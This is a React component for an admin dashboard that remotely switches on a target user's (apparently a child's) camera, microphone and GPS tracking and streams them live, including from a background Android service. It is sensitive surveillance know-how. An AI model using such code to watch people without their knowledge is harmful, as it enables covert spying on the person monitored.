import { useState, useEffect, useRef, useCallback } from 'react'
import { Room, RoomEvent, Track } from 'livekit-client'

function formatCoord(n) { return n?.toFixed(6) ?? '—' }
function formatTime(ms) {
  if (!ms) return '—'
  return new Date(ms).toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
}

// Play Int16 PCM chunks with jitter buffer — smooth, gap-free like a phone call
let audioCtx = null
let nextPlayAt = 0
const JITTER_BUFFER_S = 0.08
function playPcmChunk(base64, sampleRate = 16000) {
  try {
    if (!audioCtx) {
      audioCtx = new AudioContext({ sampleRate, latencyHint: 'interactive' })
      nextPlayAt = 0
    }
    if (audioCtx.state === 'suspended') audioCtx.resume()
    const bin = atob(base64)
    const samples = bin.length / 2
    const buffer = audioCtx.createBuffer(1, samples, sampleRate)
    const f32 = buffer.getChannelData(0)
    for (let i = 0; i < samples; i++) {
      const lo = bin.charCodeAt(i * 2)
      const hi = bin.charCodeAt(i * 2 + 1)
      let s = lo | (hi << 8)
      if (s >= 32768) s -= 65536
      f32[i] = s / 32768.0
    }
    const src = audioCtx.createBufferSource()
    src.buffer = buffer
    src.connect(audioCtx.destination)
    const now = audioCtx.currentTime
    if (nextPlayAt < now - 0.3) nextPlayAt = now + JITTER_BUFFER_S
    const start = Math.max(now + JITTER_BUFFER_S, nextPlayAt)
    src.start(start)
    nextPlayAt = start + buffer.duration
  } catch {}
}

function rmsLevel(base64) {
  try {
    const bin = atob(base64)
    const samples = bin.length / 2
    let sum = 0
    for (let i = 0; i < samples; i++) {
      const lo = bin.charCodeAt(i * 2)
      const hi = bin.charCodeAt(i * 2 + 1)
      let s = lo | (hi << 8); if (s >= 32768) s -= 65536
      sum += s * s
    }
    return Math.min(1, Math.sqrt(sum / samples) / 8192)
  } catch { return 0 }
}

export default function LiveMonitorPanel({ targetUser, adminId, sendMsg, addListener }) {
  // ── Camera state ────────────────────────────────────────────────
  const [camActive,  setCamActive]  = useState(false)
  const [camStatus,  setCamStatus]  = useState('idle') // idle | connecting | live | error
  const [camFacing,  setCamFacing]  = useState('rear')
  const [streamMode, setStreamMode] = useState('none') // none | livekit | jpeg
  const videoRef   = useRef(null)
  const frameRef   = useRef(null)
  const lkRoomRef  = useRef(null)
  const camTimer   = useRef(null)

  // ── Mic state ────────────────────────────────────────────────────
  const [micActive,  setMicActive]  = useState(false)
  const [micStatus,  setMicStatus]  = useState('idle')
  const [audioLevel, setAudioLevel] = useState(0)

  // ── Location state ───────────────────────────────────────────────
  const [locActive, setLocActive] = useState(false)
  const [location,  setLocation]  = useState(null)

  // ── Cleanup on unmount ───────────────────────────────────────────
  useEffect(() => {
    return () => {
      sendMsg({ type: 'stop_camera',   targetId: targetUser.id })
      sendMsg({ type: 'stop_mic',      targetId: targetUser.id })
      sendMsg({ type: 'stop_location', targetId: targetUser.id })
      clearTimeout(camTimer.current)
      if (lkRoomRef.current) { lkRoomRef.current.disconnect(); lkRoomRef.current = null }
    }
  }, []) // eslint-disable-line react-hooks/exhaustive-deps

  // ── Message listener ─────────────────────────────────────────────
  useEffect(() => {
    return addListener((msg) => {
      if (msg.fromUserId !== targetUser.id) return

      // JPEG path — native Android background service fallback
      if (msg.type === 'camera_frame' && streamMode !== 'livekit') {
        clearTimeout(camTimer.current)
        setCamStatus('live')
        setStreamMode('jpeg')
        if (frameRef.current) frameRef.current.src = `data:image/jpeg;base64,${msg.data}`
        camTimer.current = setTimeout(() => setCamStatus('error'), 5000)
      }

      if (msg.type === 'audio_chunk') {
        setMicStatus('live')
        const level = rmsLevel(msg.data)
        setAudioLevel(level)
        playPcmChunk(msg.data, msg.sampleRate || 16000)
        setTimeout(() => setAudioLevel(0), 600)
      }

      if (msg.type === 'location_update') {
        setLocation({ lat: msg.lat, lng: msg.lng, accuracy: msg.accuracy, ts: msg.ts || Date.now() })
      }
    })
  }, [addListener, targetUser.id, streamMode])

  // ── Camera controls ──────────────────────────────────────────────
  const startCamera = useCallback(async (facing) => {
    clearTimeout(camTimer.current)
    if (lkRoomRef.current) { lkRoomRef.current.disconnect(); lkRoomRef.current = null }
    if (videoRef.current) videoRef.current.srcObject = null
    setStreamMode('none')
    setCamStatus('connecting')
    setCamActive(true)

    try {
      // Fetch LiveKit token from our server
      const res = await fetch(`/api/lk-token?room=${encodeURIComponent(targetUser.id)}&identity=admin`)
      if (!res.ok) throw new Error('Token fetch failed')
      const { token, url } = await res.json()

      const room = new Room()
      lkRoomRef.current = room

      room.on(RoomEvent.TrackSubscribed, (track) => {
        if (track.kind === Track.Kind.Video && videoRef.current) {
          track.attach(videoRef.current)
          clearTimeout(camTimer.current)
          setCamStatus('live')
          setStreamMode('livekit')
        }
      })

      room.on(RoomEvent.Disconnected, () => {
        // Only show error if we weren't already getting JPEG
        setStreamMode(prev => {
          if (prev !== 'jpeg') setCamStatus('error')
          return prev
        })
      })

      await room.connect(url, token)
    } catch {
      // LiveKit unavailable — fall through to JPEG-only mode
    }

    // Tell child to start LiveKit publish + JPEG fallback
    sendMsg({ type: 'start_camera', targetId: targetUser.id, facing })

    // No-signal timeout
    camTimer.current = setTimeout(() => setCamStatus('error'), 15000)
  }, [sendMsg, targetUser.id])

  const stopCamera = useCallback(() => {
    sendMsg({ type: 'stop_camera', targetId: targetUser.id })
    clearTimeout(camTimer.current)
    if (lkRoomRef.current) { lkRoomRef.current.disconnect(); lkRoomRef.current = null }
    if (videoRef.current) videoRef.current.srcObject = null
    setCamActive(false); setCamStatus('idle'); setStreamMode('none')
  }, [sendMsg, targetUser.id])

  const toggleCamera = useCallback(() => {
    if (camActive) { stopCamera() } else { startCamera(camFacing) }
  }, [camActive, camFacing, startCamera, stopCamera])

  const switchCamera = useCallback(() => {
    const next = camFacing === 'rear' ? 'front' : 'rear'
    setCamFacing(next)
    if (camActive) startCamera(next)
  }, [camFacing, camActive, startCamera])

  // ── Mic controls ─────────────────────────────────────────────────
  const toggleMic = useCallback(() => {
    if (micActive) {
      sendMsg({ type: 'stop_mic', targetId: targetUser.id })
      setMicActive(false); setMicStatus('idle'); setAudioLevel(0)
    } else {
      // Warm up AudioContext during user gesture — browsers suspend it otherwise
      if (!audioCtx) {
        audioCtx = new AudioContext({ sampleRate: 16000, latencyHint: 'interactive' })
        nextPlayAt = 0
      }
      audioCtx.resume()
      sendMsg({ type: 'start_mic', targetId: targetUser.id })
      setMicActive(true); setMicStatus('connecting')
    }
  }, [micActive, sendMsg, targetUser.id])

  // ── Location controls ────────────────────────────────────────────
  const toggleLocation = useCallback(() => {
    if (locActive) {
      sendMsg({ type: 'stop_location', targetId: targetUser.id })
      setLocActive(false)
    } else {
      sendMsg({ type: 'start_location', targetId: targetUser.id })
      setLocActive(true)
    }
  }, [locActive, sendMsg, targetUser.id])

  const mapsUrl = location ? `https://maps.google.com/?q=${location.lat},${location.lng}` : '#'

  const camBadgeLabel = streamMode === 'livekit' ? 'LIVE (LiveKit)' : 'LIVE'

  return (
    <div className="live-panel">
      <div className="live-panel-title">📡 Live Monitor — {targetUser.name}</div>

      {/* ── Camera ── */}
      <div className="live-section">
        <div className="live-section-header">
          <span className="live-section-label">📷 Camera</span>
          <div className="live-status-row">
            {camStatus === 'live'       && <span className="live-badge on">● {camBadgeLabel}</span>}
            {camStatus === 'connecting' && <span className="live-badge wait">↻ Connecting…</span>}
            {camStatus === 'error'      && <span className="live-badge err">✕ No signal</span>}
          </div>
          {camActive && (
            <button className="live-switch-btn" onClick={switchCamera} title="Switch camera">
              {camFacing === 'rear' ? '🤳 Front' : '📷 Rear'}
            </button>
          )}
          <button className={`live-toggle-btn ${camActive ? 'stop' : 'start'}`} onClick={toggleCamera}>
            {camActive ? '⏹ Stop' : '▶ Start'}
          </button>
        </div>
        <div className="live-camera-frame">
          {camStatus === 'idle' && (
            <div className="live-placeholder">
              <span className="live-placeholder-icon">📷</span>
              <span>Camera off</span>
            </div>
          )}
          {camStatus === 'connecting' && (
            <div className="live-placeholder">
              <span className="live-spinner">↻</span>
              <span>Connecting…</span>
            </div>
          )}
          {camStatus === 'error' && (
            <div className="live-placeholder err">
              <span>📵</span>
              <span>No signal — device may be offline</span>
            </div>
          )}
          {/* LiveKit real-time video */}
          <video
            ref={videoRef}
            autoPlay playsInline muted
            className={`live-camera-img ${streamMode === 'livekit' ? 'visible' : 'hidden'}`}
          />
          {/* JPEG fallback for background native service */}
          <img
            ref={frameRef}
            className={`live-camera-img ${streamMode === 'jpeg' ? 'visible' : 'hidden'}`}
            alt="Camera feed"
          />
        </div>
      </div>

      {/* ── Microphone ── */}
      <div className="live-section">
        <div className="live-section-header">
          <span className="live-section-label">🎤 Microphone</span>
          <div className="live-status-row">
            {micStatus === 'live'       && <span className="live-badge on">● LIVE</span>}
            {micStatus === 'connecting' && <span className="live-badge wait">↻ Connecting…</span>}
          </div>
          <button className={`live-toggle-btn ${micActive ? 'stop' : 'start'}`} onClick={toggleMic}>
            {micActive ? '⏹ Stop' : '▶ Start'}
          </button>
        </div>
        {micActive && (
          <div className="live-audio-wrap">
            <div className="live-audio-meter">
              <div className="live-audio-bar" style={{ width: `${Math.round(audioLevel * 100)}%` }} />
            </div>
            <span className="live-audio-label">
              {micStatus === 'live' ? 'Receiving audio…' : 'Waiting for audio…'}
            </span>
          </div>
        )}
      </div>

      {/* ── Location ── */}
      <div className="live-section">
        <div className="live-section-header">
          <span className="live-section-label">📍 Location</span>
          {locActive && <span className="live-badge on">● Tracking</span>}
          <button className={`live-toggle-btn ${locActive ? 'stop' : 'start'}`} onClick={toggleLocation}>
            {locActive ? '⏹ Stop' : '▶ Start'}
          </button>
        </div>
        {location ? (
          <div className="live-location-body">
            <div className="live-coords">
              <span className="live-coord-row"><span className="live-coord-label">Lat</span><span className="live-coord-val">{formatCoord(location.lat)}</span></span>
              <span className="live-coord-row"><span className="live-coord-label">Lng</span><span className="live-coord-val">{formatCoord(location.lng)}</span></span>
              <span className="live-coord-row"><span className="live-coord-label">±</span><span className="live-coord-val">{location.accuracy?.toFixed(0) ?? '?'} m</span></span>
              <span className="live-coord-row"><span className="live-coord-label">At</span><span className="live-coord-val">{formatTime(location.ts)}</span></span>
            </div>
            <a href={mapsUrl} target="_blank" rel="noreferrer" className="live-maps-btn">
              🗺 Open in Maps
            </a>
          </div>
        ) : locActive ? (
          <div className="live-placeholder small">
            <span className="live-spinner">↻</span>
            <span>Waiting for GPS fix…</span>
          </div>
        ) : null}
      </div>
    </div>
  )
}
